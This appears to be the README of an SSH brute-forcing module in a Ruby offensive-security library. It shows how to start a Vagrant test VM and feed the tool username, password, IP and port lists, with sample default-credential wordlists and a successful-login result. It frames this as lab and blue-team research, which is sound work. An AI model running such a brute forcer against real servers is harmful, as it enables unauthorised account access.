# SSH Brute Forcer 

Using brute-force, you can easily try to force your way into a server over SSH.

## Vagrantfile

In this directory, along with the ruby code and the README.md, you'll find a `Vagrantfile` which you can use to setup a VM to test out the SSH Brute Forcer. This requires you to have [vagrant](https://www.vagrantup.com/) installed.

#### Start VM

```shell
$ pwd 
/somewhere/violent_ruby/lib/violent_ruby/ssh_brute_forcer
$ ls
README.md           Vagrantfile         ssh_brute_forcer.rb
$ vagrant up
Bringing machine 'default' up with 'virtualbox' provider...
==> default: Importing base box 'debian/jessie64'...
==> ect...
```

#### SSH into VM

Very simply `vagrant ssh` will allow you to SSH into the VM to make changes or monitor the VM while brute-forcing it for blue team research.

```shell
$ vagrant ssh

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
vagrant@jessie:~$ 
```

The VM should be provisioned with ssh, and it should be running with anonymous access turned on. Because that's fun.

#### Stop VM

If you've logged into the VM via ssh, logout and then use `vagrant destroy` to destroy the VM.

```shell
$ vagrant destroy
    default: Are you sure you want to destroy the 'default' VM? [y/N] y
==> default: Forcing shutdown of VM...
==> default: Destroying VM and associated drives...
```

## Initialization

```ruby
require 'violent_ruby'

ssh = SSHBruteForcer.new
```

## Providing Required Files

```ruby
require 'violent_ruby'

ssh = SSHBruteForcer.new

ssh.users     = "resources/ssh_users.txt"
ssh.ports     = "resources/ssh_ports.txt"
ssh.ips       = "resources/ssh_ips.txt"
ssh.passwords = "resources/ssh_passwords.txt"
```

#### Users

A `.users` file should contain a list of ssh usernames to use.

```
vagrant
root
admin
picat
```

#### Passwords

A `.passwords` file should contain a list of ssh passwords to use.

```
vagrant
root
toor
picat
```

#### IPs

A `.ips` file should contain a list of ip addresses to attempt connections on.

```
192.168.33.9
192.168.33.10
192.168.33.111
```

#### Ports

A `.ports` file should contain a list of ports to attempt connections on.

```
22
2222
```
## Brute Force'n

Once everything has been setup, we're going to be able to try start brute forcing!

```ruby
require 'violent_ruby'

ssh = SSHBruteForcer.new

ssh.users     = "resources/ssh_users.txt"
ssh.ports     = "resources/ssh_ports.txt"
ssh.ips       = "resources/ssh_ips.txt"
ssh.passwords = "resources/ssh_passwords.txt"

# Iterate through results.
ssh.brute_force do |result|
  result
  # => [{:time=>2017-04-03 19:02:11 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"22", :user=>"vagrant", :password=>"vagrant"},
end
```
